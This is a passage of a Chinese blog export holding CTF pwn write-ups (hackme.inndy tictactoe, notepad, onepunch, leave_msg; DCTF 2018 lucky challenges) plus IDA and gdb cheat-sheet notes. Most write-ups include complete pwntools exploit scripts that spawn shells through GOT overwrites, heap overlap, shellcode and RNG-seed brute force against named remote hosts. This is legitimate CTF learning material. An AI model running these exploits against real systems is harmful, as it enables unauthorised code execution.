&lt;80482F8h&gt;&gt; ; DT_STRTAB//要修改的地方 LOAD:0804AF5C Elf32_Dyn &lt;6, &lt;80481D8h&gt;&gt; ; DT_SYMTAB LOAD:0804AF64 Elf32_Dyn &lt;0Ah, &lt;0BCh&gt;&gt; ; DT_STRSZ LOAD:0804AF6C Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt; ; DT_SYMENT LOAD:0804AF74 Elf32_Dyn &lt;15h, &lt;0&gt;&gt; ; DT_DEBUG LOAD:0804AF7C Elf32_Dyn &lt;3, &lt;804B000h&gt;&gt; ; DT_PLTGOT LOAD:0804AF84 Elf32_Dyn &lt;2, &lt;68h&gt;&gt; ; DT_PLTRELSZ LOAD:0804AF8C Elf32_Dyn &lt;14h, &lt;11h&gt;&gt; ; DT_PLTREL LOAD:0804AF94 Elf32_Dyn &lt;17h, &lt;8048430h&gt;&gt; ; DT_JMPREL LOAD:0804AF9C Elf32_Dyn &lt;11h, &lt;8048418h&gt;&gt; ; DT_REL LOAD:0804AFA4 Elf32_Dyn &lt;12h, &lt;18h&gt;&gt; ; DT_RELSZ LOAD:0804AFAC Elf32_Dyn &lt;13h, &lt;8&gt;&gt; ; DT_RELENT LOAD:0804AFB4 Elf32_Dyn &lt;6FFFFFFEh, &lt;80483D8h&gt;&gt; ; DT_VERNEED LOAD:0804AFBC Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUM LOAD:0804AFC4 Elf32_Dyn &lt;6FFFFFF0h, &lt;80483B4h&gt;&gt; ; DT_VERSYM LOAD:0804AFCC Elf32_Dyn &lt;0&gt; ; DT_NULL 先简单回顾下_dl_fixup的流程 根据rel_offset 得到函数reloc结构体在JMPREL中的位置 根据reloc结构体中的r_offset 得到函数在got表中的地址 根据reloc结构体中的r_info&gt;&gt;8得到函数的sym结构体在symtab中的位置 根据sym结构中的st.name 得到函数字符串在strtab表中的位置 最后根据得到的函数名称解析函数地址，将函数地址写入got表 在这里因为有任意地址写漏洞，并且存储着DT_STRTAB等节地址的地方是可以写的 所以可以修改DT_STRTAB。因为程序最后会执行memset函数，所以选择修改DT_STRTAB，使得在memset在调用_dl_fixup函数时查找函数名字符串时获得的字符串是”system“，最终解析出system函数，并且向n写入’sh\x00’，那么最后执行memset时就会执行system(‘sh\x00’) memset(&amp;n, 0, 0x18u); memset函数的字符串在DT_STRTAB中的偏移为 68 system函数的字符串的地址 —&gt;[0x804900c] target = 0x8049fc8 将DT_STRTAB修改为 target= system_add - 68，这样的话当memset函数去DT_STRTAB中查找字符串时就会得到”system”字符串 for ( i = 0; i &lt;= 8 &amp;&amp; !sub_80487F6(); ++i ) { if ( n == -1 ) { sub_80489C0(); } else { sub_8048762(); sub_8048A4B(); } n = -n; } 不过这里还要注意的是往n写入sh字符串时，这里会每次都会取反，所以在 i 等于奇数的时候写入sh字符串，最后在内存中的就是输入的sh字符串了。 exp: #!/usr/bin/env python from pwn import * local = 1 if local: p = process(&#39;./tictactoe&#39;) elf = ELF(&#39;./tictactoe&#39;) libc = elf.libc else: host = &#39;hackme.inndy.tw&#39; port = &#39;7714&#39; p = remote(host,port) elf = ELF(&#39;./tictactoe&#39;) context.arch = elf.arch context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] context.log_level=&#39;debug&#39; def sd(content): p.send(content) def sl(content): p.sendline(content) def rc(): return p.recv() def ru(content): return p.recvuntil(content) def debug(addr,PIE=False): if PIE: text_base = int(os.popen(&quot;pmap {}| awk &#39;{{print }}&#39;&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,&#39;b *{}&#39;.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr))) def change(addr,value): ru(&quot;flavor):&quot;) sl(&#39;9&#39;) sleep(0.1) sl(value) offset = addr - 0x804B056 ru(&#39;flavor): &#39;) sl(str(offset)) targe = 0x8049fc8 addr_STRTAB = 0x0804AF58 n = 0x0804B048 bss = elf.bss() rc() sl(&#39;1&#39;) change(n,&#39;\x99&#39;) #0 change(n,&#39;\x73&#39;) #1 change(addr_STRTAB,&#39;\xc8&#39;) #2 change(n + 1,&#39;\x68&#39;) #3 change(addr_STRTAB + 1,&#39;\x9f&#39;) #4 change(n+2,&#39;\x00&#39;) #5 change(n+0x10,&#39;\xff&#39;) #6 change(bss+0x100,&#39;\xff&#39;) #7 change(bss+0x100,&#39;\xff&#39;) #8 rc() p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tictactoe1 writeup]]></title>
    <url>%2F2018%2F09%2F24%2F2018-9-24-tictactoe-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： [*] &#39;/home/zs0zrc/pwn/Scoreboard/tictactoe/tictactoe&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 这个程序是模拟下三子棋的机器人，程序的漏洞在 unsigned int sub_8048A4B() { int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;\nInput move (9 to change flavor): &quot;); v1 = read_int();//没有对输入的数字进行检查 if ( v1 == 9 ) { read(0, &amp;buf, 4u); byte_804B04C = buf; sub_8048A4B(); } else { *(v1 + 0x804B056) = byte_804B04C;//可以输入负数，造成任意地址写，但是只能修改三次 if ( sub_80486F0(v1) ) *(v1 + 0x804B04D) = -1; } return __readgsdword(0x14u) ^ v3; 同时程序中有输出flag的代码 else if ( v1 == -1 ) { print_msg(&quot;You win. Inconceivable!&quot;); fd = open(&quot;flag_simple&quot;, 0); v5 = read(fd, buf, 0x100u); if ( fd &lt;= 0 || v5 &lt;= 0 ) { print_msg(&quot;Can not read flag! Pls contact admin&quot;); } else { buf[v5] = 0; printf(&quot;Here is your flag: %s\n&quot;, buf); print_msg(&quot;You need a shell to get another flag&quot;); } exit(0); } 所以只要修改got表中没有被调用过的函数，使其指向这段代码的地址就好了。这里之所以要修改没调用的是因为没调用的函数在其got表中存储的是plt表的地址，是指向程序代码段的，如果是调用过的函数，它got表中存储的是libc的地址。 这里选择修改puts_got –&gt;[0x0804B024] 计算偏移 offset = -50 exp： #!/usr/bin/env python from pwn import * local = 1 if local: p = process(&#39;./tictactoe&#39;) elf = ELF(&#39;./tictactoe&#39;) libc = elf.libc else: host = &#39;hackme.inndy.tw&#39; port = &#39;7714&#39; p = remote(host,port) elf = ELF(&#39;./tictactoe&#39;) context.arch = elf.arch context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] context.log_level=&#39;debug&#39; def sd(content): p.send(content) def sl(content): p.sendline(content) def rc(): return p.recv() def ru(content): return p.recvuntil(content) def debug(addr,PIE=False): if PIE: text_base = int(os.popen(&quot;pmap {}| awk &#39;{{print }}&#39;&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,&#39;b *{}&#39;.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr))) #target = elf.symbols[&#39;puts&#39;] #target = 0x0804B024 vuln = 0x804B04D offest = -50 #gdb.attach(p,&#39;b *0x08048A9E&#39;) ru(&quot;Play (1)st or (2)nd? &quot;) sl(&#39;1&#39;) ru(&quot;flavor):&quot;) sl(&#39;9&#39;) sl(chr(0x46)) ru(&quot; flavor):&quot;) sl(&#39;-50&#39;) ru(&quot; flavor):&quot;) sl(&#39;9&#39;) sl(chr(0x8c)) ru(&quot; flavor):&quot;) sl(&#39;-49&#39;) sl(&#39;1&#39;) p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DCTF Quals 2018 pwn题简单复现]]></title>
    <url>%2F2018%2F09%2F24%2F2018-9-24-DefCamp-CTF-pwn%E9%A2%98%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[这个比赛我就做出了第一道pwn….C++逆向真的是看到脑壳疼，还有一个pwn题用到了CVE-2018-11235 ….真的是打扰了 lucky 这道题是猜随机数，只是这题目是用C++写的，逆向看的有点难受 因为随机数的seed在栈上，加上它在输入name时，用了strcpy函数，没有限制输入的长度，所以可以覆盖seed的值为0x61616161。加上它在输入名字后又srand了一次，所以seed就被我们控制了，产生的随机数也就是确定的。 ida反编译看到的代码是长这样的 生成随机数的源码 #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; int main(){ srand(0x61616161); for(int i=0;i&lt;100;i++){ printf(&quot;%d\n&quot;,rand()); } return 0; } exp: #!/usr/bin/env python from pwn import * local = 0 if local: p = process(&#39;./lucky&#39;) elf = ELF(&#39;./lucky&#39;) libc = elf.libc else: host = &#39;167.99.143.206&#39; port = &#39;65031&#39; p = remote(host,port) elf = ELF(&#39;./lucky&#39;) context.arch = elf.arch context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] context.log_level=&#39;debug&#39; def sd(content): p.send(content) def sl(content): p.sendline(content) def rc(): return p.recv() def ru(content): return p.recvuntil(content) def debug(addr,PIE=False): if PIE: text_base = int(os.popen(&quot;pmap {}| awk &#39;{{print $1}}&#39;&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,&#39;b *{}&#39;.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr))) fp = open(&#39;random.txt&#39;) l = [] for i in fp: l.append(i) rc() sl(&#39;a&#39;*0x2c4) for i in range(100): rc() sd(l[i]) rc() print rc()#DCTF{8adadb46b599a58344559e009bc167da7f0e65e64167c27d3192e8b6df073eaa} p.interactive() more lucky 这题比赛时没做出来，它也是和随机数有关的，但是它没有lucky的漏洞，不能覆盖栈上的seed。 先简单分析下文件,ida反编译出来的代码长这样 拖进编辑器里修改成能看版： __int64 __fastcall main(__int64 a1, char **a2, char **a3) { times = time(0LL); srand(times / 10); cout&lt;&lt;&quot;Hello, there!&quot;&lt;&lt;endl； cout&lt;&lt;&quot;What is your name?&quot;&lt;&lt;endl; cin.getline(&amp;name); sub_2033(&amp;v28, times / 10000, times / 10000, times, v6, v7); serv_time = v28; cout&lt;&lt;&quot;I am glad to know you, &quot;&lt;&lt;name&lt;&lt;&quot;!&quot;&lt;&lt;endl; cout&lt;&lt;&quot;Server time: &quot;&lt;&lt;serv_time&lt;&lt;endl; cout&lt;&lt;&quot;If you guess the next 100 random numbers I shall give you the flag!&quot;&lt;&lt;endl; for ( i = 0; i &lt;= 99; ++i ) { v30 = rand(); cout&lt;&lt;&quot;What number am I thinking of? [&quot;&lt;&lt;i&lt;&lt;&quot;/100]&quot;&lt;&lt;endl; cin&gt;&gt;buf; v29 = sub_1FE9(&amp;buf, 0LL, 10LL); if ( v29 != v30 ) { cout&lt;&lt;&quot;Wow that is wrong!&quot;&lt;&lt;endl; return -1 } cout&lt;&lt;&quot;Wow that is corect!&quot;&lt;&lt;endl; } ifs = ifstream(&quot;./flag2&quot;); if ( is_open(ifs) ) { ifs.getline(flag); cout &lt;&lt; flag &lt;&lt; endl; ifs.close(); } return 0; } 这题和lucky的不同在于它使用的srand(time/10)来做随机数的种子，并且它将 time/10000打印出来了。 程序先根据time(0)生成服务器时间，然后srand(times/10)来设置seed的值。用户输入name后，将times/10000打印出来。而且它没有再次srand(),所以需要找到seed的值。这里它使用srand(times/10)来初始化seed值，并且只有最后三位是未知的。因为time(0)返回以秒为单位的时间，它用times/10来做srand()的参数，最后三位数每隔十秒增加一次，这使得它很容易受到暴力攻击。 根据大佬的writeup，暴力猜它服务器的时间，猜对的可能性为1/1000，所以写脚本暴力跑 生成随机数的c代码： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main(int argc, char **argv) { int seed = atoi(argv[1]); srand(seed); for (int i = 0; i &lt; 100; i++) { printf(&quot;%d\n&quot;, rand()); } return 0; } exp: #!/usr/bin/env python from pwn import * import subprocess local = 1 if local: p = process(&#39;./lucky2&#39;) elf = ELF(&#39;./lucky2&#39;) libc = elf.libc else: host = &#39;167.99.143.206&#39; port = &#39;65032&#39; p = remote(host,port) elf = ELF(&#39;./lucky2&#39;) context.log_level=&#39;debug&#39; def sd(content): p.send(content) def sl(content): p.sendline(content) def rc(): return p.recv() def ru(content): return p.recvuntil(content) times = 153778000 for i in range(1000): times += 1 print&quot;times--&gt;[{}]&quot;.format(times) p = remote(&quot;167.99.143.206&quot;, 65032) rc() sl(&#39;aaaa&#39;) number = subprocess.check_output([&quot;./rand1&quot;, str(times)]).split(&#39;\n&#39;) try: for i in range(100): ru(&quot;100]&quot;) sl(number[i]) p.interactive() #DCTF{2e7aaa899a8b212ea6ebda3112d24559f2d2c540a9a29b1b47477ae8e5f20ace} except EOFError: pass Online linter 这就是那道用到了CVE的题目，orz , drl。以后再研究吧 贴下大佬writeup的地址 writeup]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[notepad writeup]]></title>
    <url>%2F2018%2F09%2F23%2F2018-9-22-notepad-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： [*] &#39;/home/zs0zrc/pwn/Scoreboard/notepad/notepad&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 这题的漏洞主要在于 notepad_open函数中的menu函数，它对输入的上界进行了检查，但是没对下界进行检查，导致可以输入比 ‘a’小的字符,加上它根据menu的返回值来确定调用函数的位置的，所以可以提前在堆上布置好函数指针，通过输入notepad_open函数，输入特定的字符，来调用布置在堆上的函数指针 int __cdecl menu(int a1) { int result; // eax int i; // [esp+8h] [ebp-10h] int v3; // [esp+Ch] [ebp-Ch] for ( i = 0; *(4 * i + a1); ++i ) printf(&quot;%c&gt; %s\n&quot;, i + &#39;a&#39;, *(4 * i + a1)); printf(&quot;::&gt; &quot;); v3 = getchar() - &#39;a&#39;; freeline(); if ( v3 &lt; i ) // vuln result = v3 + 1; else result = 0; return result; } //调用函数的代码 v0 = menu(&amp;v4); (*(&amp;v3-&gt;show + v0 - 1))(v3);//这里v0是menu返回的数字 //它根据 note的show指针的地址 + v0 -1来确定函数的地址 note的结构： struct note{ notepad_show *notepad_show; notepad_destroy *notepad_destroy; int flags; int n; } 具体的思路： 先分配三个small bins大小的chunk，在第一个chunk中布置好 free_plt的地址，然后用notepad_open函数的漏洞，调用free_plt，将chunk2 free掉。这时只要delete掉chunk1，chunk1和chunk2就会进行unlink合并，将这个合并后的chunk申请回来，就可以对chunk2造成overlap，就可以控制chunk2的函数指针。利用printf函数泄露出libc的地址，最后再构成system(‘/bin/sh\x00’) 函数来getshell 先create三个0x60大小的chunk new(0x60,&#39;aaaaa&#39; + &#39;\n&#39;)#chunk1 new(0x60,&#39;aaaaa&#39; + &#39;\n&#39;)#chunk2 new(0x60,&#39;aaaaa&#39; + &#39;\n&#39;)#chunk3 在chunk1中布置好free函数指针，调用notepad_open 使得chunk2被free掉 payload = &#39;a&#39;*0x5c + p32(elf.symbols[&#39;free&#39;]) open_y(0,payload+&#39;\n&#39;) open_y(1,&#39;aaaa\n&#39;,&#39;^&#39;)# &#39;^&#39; mean ord(&#39;a&#39;) - 3 delete掉chunk1，使chunk1和chunk2合并，再从堆中申请到合并后的chunk,布置好printf函数指针，泄露出libc地址 delete(0) payload1 = &#39;a&#39; * 0x5c + p32(elf.symbols[&#39;printf&#39;]) + &#39;aaaa&#39; payload1 += &#39;a&#39;*4 + &#39;%1000$p\x00&#39; + &#39;\n&#39; new(0xe0 - 16,payload1) open_n(1,&#39;^&#39;) leak = int(p.recv(10),16) libc_base = leak - libc.symbols[&#39;_IO_2_1_stdin_&#39;] libc.address = libc_base system = libc.symbols[&#39;system&#39;] delete 掉chunk1，布置好system函数，调用system函数 delete(0) payload2 = &#39;a&#39;*0x5c + p32(system) + &#39;aaaa&#39; payload2 += &#39;aaaa&#39; + &#39;/bin/sh\x00&#39; + &#39;\n&#39; new(0xe0 - 16,payload2) open_n(1,&#39;^&#39;) p.interactive() exp: #!/usr/bin/env python from pwn import * local = 0 if local: p = process(&#39;./notepad&#39;) elf = ELF(&#39;./notepad&#39;) libc = elf.libc else: host = &#39;hackme.inndy.tw&#39; port = &#39;7713&#39; p = remote(host,port) elf = ELF(&#39;./notepad&#39;) libc = ELF(&#39;./libc-2.23.so.i386&#39;) context.arch = elf.arch context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] context.log_level=&#39;debug&#39; def sd(content): p.send(content) def sl(content): p.sendline(content) def rc(): return p.recv() def ru(content): return p.recvuntil(content) def debug(addr,PIE=False): if PIE: text_base = int(os.popen(&quot;pmap {}| awk &#39;{{print $1}}&#39;&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,&#39;b *{}&#39;.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr))) def new(size,content): ru(&quot;::&gt; &quot;) sl(&#39;a&#39;) ru(&quot;size &gt; &quot;) sl(str(size)) ru(&quot;data &gt; &quot;) sd(content) def open_y(idx,content,flags = &#39;a&#39;): ru(&quot;::&gt; &quot;) sl(&#39;b&#39;) ru(&quot;id &gt; &quot;) sl(str(idx)) ru(&quot;edit (Y/n)&quot;) sl(&quot;y&quot;) ru(&quot;content &gt; &quot;) sd(content) rc() sl(flags) def open_n(idx,flags = &#39;a&#39;): ru(&quot;::&gt; &quot;) sl(&#39;b&#39;) ru(&quot;id &gt; &quot;) sl(str(idx)) rc() sl(&quot;n&quot;) rc() sl(flags) def delete(idx): ru(&quot;::&gt; &quot;) sl(&#39;c&#39;) rc() sl(str(idx)) def setread(idx): ru(&quot;::&gt; &quot;) sl(&#39;d&#39;) rc() sl(str(idx)) def keepsec(idx): ru(&quot;::&gt; &quot;) sl(&#39;e&#39;) rc() sl(str(idx)) rc() sl(&#39;c&#39;) #gdb.attach(p,&#39;b *0x08048CCD&#39;) new(0x60,&#39;aaaaa&#39; + &#39;\n&#39;)#chunk1 new(0x60,&#39;aaaaa&#39; + &#39;\n&#39;)#chunk2 new(0x60,&#39;aaaaa&#39; + &#39;\n&#39;)#chunk3 payload = &#39;a&#39;*0x5c + p32(elf.symbols[&#39;free&#39;]) open_y(0,payload+&#39;\n&#39;) open_y(1,&#39;aaaa\n&#39;,&#39;^&#39;) delete(0) payload1 = &#39;a&#39; * 0x5c + p32(elf.symbols[&#39;printf&#39;]) + &#39;aaaa&#39; payload1 += &#39;a&#39;*4 + &#39;%1000$p\x00&#39; + &#39;\n&#39; new(0xe0 - 16,payload1) open_n(1,&#39;^&#39;) leak = int(p.recv(10),16) libc_base = leak - libc.symbols[&#39;_IO_2_1_stdin_&#39;] libc.address = libc_base system = libc.symbols[&#39;system&#39;] delete(0) payload2 = &#39;a&#39;*0x5c + p32(system) + &#39;aaaa&#39; payload2 += &#39;aaaa&#39; + &#39;/bin/sh\x00&#39; + &#39;\n&#39; new(0xe0 - 16,payload2) open_n(1,&#39;^&#39;) p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[onepunch writeup]]></title>
    <url>%2F2018%2F09%2F22%2F2018-9-22-onepunch-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： [*] &#39;/home/zs0zrc/pwn/Scoreboard/onepunch/onepunch&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 程序的ida反编译出来的代码很短： int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp+8h] [rbp-18h] int v5; // [rsp+Ch] [rbp-14h] _BYTE *v6; // [rsp+10h] [rbp-10h] unsigned __int64 v7; // [rsp+18h] [rbp-8h] v7 = __readfsqword(0x28u); setbuf(_bss_start, 0LL); printf(&quot;Where What?&quot;, 0LL); v5 = __isoc99_scanf(&quot;%llx %d&quot;, &amp;v6, &amp;v4); if ( v5 != 2 ) return 0; *v6 = v4; if ( v4 == &#39;\xFF&#39; ) puts(&quot;No flag for you&quot;); return 0; 程序要求输入一个地址，然后再往输入的地址写一个整数。然后再判断输入的整数是否等于255，如果等于就利用puts函数打印一句话然后退出。 这个程序只有一次任意地址写的机会，因为没有给不知道libc地址，所以写got表就不可行。在gdb调试时，发现 text段竟然具有可写的权限，所以可以通过patch程序来修改程序逻辑。 先修改程序逻辑，实现能循环读取 修改 0x400767处的 “jnz short loc_400773”为 “jnz_40071d” changeadd(0x400768,0xb4) 然后往0x400769处写入shellcode shellcode = asm(shellcraft.sh()) for i in range(len(shellcode)): changeadd(0x400769+i,ord(shellcode[i])) exp: #!/usr/bin/env python from pwn import * local = 0 if local: p = process(&#39;./onepunch&#39;) elf = ELF(&#39;./onepunch&#39;) libc = elf.libc else: host = &#39;hackme.inndy.tw&#39; port = &#39;7718&#39; p = remote(host,port) elf = ELF(&#39;./onepunch&#39;) context.arch = elf.arch context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] context.log_level=&#39;debug&#39; def sd(content): p.send(content) def sl(content): p.sendline(content) def rc(): return p.recv() def ru(content): return p.recvuntil(content) def changeadd(addr,content): ru(&quot;Where What?&quot;) p.sendline(&quot;{} {}&quot;.format(hex(addr),content)) changeadd(0x400768,0xb4) shellcode = asm(shellcraft.sh()) for i in range(len(shellcode)): changeadd(0x400769+i,ord(shellcode[i])) changeadd(0x400800,0xff) p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[leave_msg writeup]]></title>
    <url>%2F2018%2F09%2F22%2F2018-9-22-leave_msg-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： [*] &#39;/home/zs0zrc/pwn/Scoreboard/leave_msg/leave_msg&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 只开启了Canary，没开NX，说明应该是要写shellcode 拖入ida反编译，发现程序的功能很简单。可以输入三次message，每次输入message后还要输入要插入的位置的下标slot。并且程序会对message的长度进行检查和输入的slot的大小进行检查。 对message长度的检查: v3 = atoi(&amp;nptr); if ( strlen(&amp;buf) &gt; 8 ) { puts(&quot;Message too long, truncated.&quot;); v6 = 0; } 对slot大小的检查： if ( v3 &lt;= 64 &amp;&amp; nptr != &#39;-&#39; ) dword_804A060[v3] = (int)strdup(&amp;buf); else puts(&quot;Out of bound.&quot;); } 两个check都过了的话就将输入的message存到bss段的一个全局数组变量中去，存储的位置由输入的下标slot决定。这里只要绕过这两个check就可以改写got表的内容了。 strlen函数：它根据碰到的第一个’\0’来计算字符串的长度，所以可以在字符串前面加’\0’来绕过检查。 nptr != ‘-‘ 可以通过在’-‘符号前加一个空格来绕过 检查绕过后，可以修改got表 puts函数的内容为 ’add esp,0x36;jmp esp’来跳转到shellcode去，然后执行shellcode，这个0x38是调试出来的 0x36 = 0x30 + len(asm(&quot;add esp,0x36;jmp esp&quot;)) + 1 exp: #!/usr/bin/env python from pwn import * local = 1 if local: p = process(&#39;./leave_msg&#39;) elf = ELF(&#39;./leave_msg&#39;) libc = elf.libc else: host = &#39;hackme.inndy.tw&#39; port = &#39;7715&#39; p = remote(host,port) elf = ELF(&#39;./leave_msg&#39;) context.arch = elf.arch context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] context.log_level=&#39;debug&#39; def sd(content): p.send(content) def sl(content): p.sendline(content) def rc(): return p.recv() def ru(content): return p.recvuntil(content) def debug(addr,PIE=False): if PIE: text_base = int(os.popen(&quot;pmap {}| awk &#39;{{print $}}&#39;&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,&#39;b *{}&#39;.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr))) shellcode = asm(&quot;add esp,0x36;jmp esp&quot;) shellcode += &#39;\x00&#39; shellcode += asm(shellcraft.sh()) ru(&quot;I&#39;m busy. Please leave your message:\n&quot;) sd(shellcode) ru(&quot;Which message slot?\n&quot;) sd(&#39; -16&#39;) p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IDA的常见操作]]></title>
    <url>%2F2018%2F09%2F21%2F2018-9-21-ida%E7%9A%84%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[IDA-python的使用：常用的api get_bytes(address,count)从address处读取count个字节的内容 patch_bytes(address,buf),将adress地址处patch成buf的内容 Xrefsto(address,flags=0) 找到所有引用了adress的地址 byte(address) 获取address地址的一个字节的内容 一些IDA常用的快捷键： 跳转到特定地址 ： G 查询交叉引用： X 查找字符串： alt + t 拍摄快照：ctrl+shift+w 重新定义变量数据类型 : y undefine一个 函数： u create 一个函数：p ida反编译的一些技巧： 如果它函数反编译出来的变量很奇怪，可以将这个函数undefine掉然后再define，这样看的变量就会正常很多 如果反编译函数显示sp指针有问题，可以通过快捷键alt+k 在报错的地址修复sp指针 如果函数的结束地址正常，可以通过快捷键alt+p修改函数结束地址 可以变量转换数组，通过快捷键 y 将数据类型修改为 对应的类型的指针 例如 char *a1 ida远程调试linux上的程序先将ida文件夹下的linux_server64或者linux_server32拷到虚拟机去然后给它执行权限，同时将要调试的文件和它放在同意文件夹，然后设置ida使用remote debugger 设置相关的路径，就可以开始调试了 ida 之定义一个结构体在 edit 中选择 Add struct type 快捷键 是ins 设置struct的name，想要向结构体添加成员的话，点击 struct ends ，然后按D，就可以添加成员，再通过 N修改成员的名字，Y修改成员的类型 00000000 ; Ins/Del : create/delete structure 00000000 ; D/A/* : create structure member (data/ascii/array) 00000000 ; N : rename structure or structure member 00000000 ; U : delete structure member 00000000 ; [00000018 BYTES. COLLAPSED STRUCT Elf64_Sym. PRESS CTRL-NUMPAD+ TO EXPAND] 00000000 ; [00000018 BYTES. COLLAPSED STRUCT Elf64_Rela. PRESS CTRL-NUMPAD+ TO EXPAND] 00000000 ; [00000010 BYTES. COLLAPSED STRUCT Elf64_Dyn. PRESS CTRL-NUMPAD+ TO EXPAND] 00000000 ; --------------------------------------------------------------------------- 00000000 00000000 struc_1 struc ; (sizeof=0x128, mappedto_6) 00000000 name dq ? ; offset 00000008 age dq ? 00000010 description db 256 dup(?) 00000110 align dq ? 00000118 friends dq ? ; offset 00000120 flags dq ? 00000128 struc_1 ends 00000128 如果想修改变量为struct的类型 ，就用 Y快捷键修改]]></content>
      <categories>
        <category>TOOL</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gdb常用命令]]></title>
    <url>%2F2018%2F09%2F20%2F2018-9-14-gdb%2F</url>
    <content type="text"><![CDATA[gdb 基础调试命令 s step，si步入 n 执行下一条指令 ni步入 b 在某处下断点，可以用 b * adrress b function_name info b 查看断点信息 delete 删除所有断点 c 继续 r 执行 disas addr 查看addr处前后的反汇编代码 disas functions 参看fucntion函数的反汇编代码 显示内存数据 p 系列 p system/main 显示某个函数地址 p $esp 显示寄存器 p/x p/a p/b p/s。。。 p 0xff - 0xea 计算器 print &amp;VarName 查看变量地址 p * 0xffffebac 查看某个地址处的值 x系列 命令格式：x/&lt;n/f/u&gt; &lt;addr&gt; n是一个正整数，表示需要显示的内存单元的个数 f 表示显示的格式(b字符，s字符串,i汇编指令,x十六进制，d十进制) u 表示从当前地址往后请求的字节数 默认4byte,u参数可以用下面的字符来代替，b表示单字节，h表示双字节，w表示四字 节，g表示八字节 &lt;addr&gt;表示一个内存地址 x/xw addr 显示某个地址处开始的16进制内容，如果有符号表会加载符号表 x/x $esp 查看esp寄存器中的值 x/s addr 查看addr处的字符串 x/b addr 查看addr处的字符 x/i addr 查看addr处的反汇编结果 info系列 info register $ebp 查看寄存器ebp中的内容 (简写为 i r ebp) i r eflags 查看状态寄存器 i r ss 查看段寄存器 i b 查看断点信息 i functions 查看所有的函数 disas addr 查看addr处前后的反汇编代码 stack 20 查看栈内20个值 show args 查看参数 vmmap 查看映射状况 peda带有 readelf 查看elf文件中各个段的起始地址 peda带有 parseheap 显示堆状况 peda带有 查找数据 find 查找字符串 peda带有 searchmem 查找字符串 peda带有 ropsearch &quot;xor eax,eax;ret&quot; 0x08048080 0x08050000 查找某段的rop peda带有 ropgadget 提供多个pop|ret可行结果 peda带有 Pwngdb插件 libc : Print the base address of libc ld : Print the base address of ld codebase : Print the base of code segment heap : Print the base of heap got : Print the Global Offset Table infomation dyn : Print the Dynamic section infomation findcall : Find some function call bcall : Set the breakpoint at some function call tls : Print the thread local storage address at : Attach by process name findsyscall : Find the syscall fmtarg : Calculate the index of format string You need to stop on printf which has vulnerability. force : Calculate the nb in the house of force. heapinfo :打印heap的一些信息 default is the arena of current thread If tcache is enable, it would show infomation of tcache entry heapinfoall : Print some infomation of heap (all threads) arenainfo : Print some infomation of all arena chunkptr : 打印chunk的信息 后面加chunk返回给用户的地址 printfastbin : 打印fastbin的链表信息 tracemalloc on : 追踪程序chunk的malloc和free parseheap :解析堆的布局 magic : 打印出glibc中一些有用的信息 fp : show FILE structure fp (Address of FILE) fpchain: show linked list of FILE orange : Test house of orange condition in the _IO_flush_lockp orange (Address of FILE) glibc version &lt;= 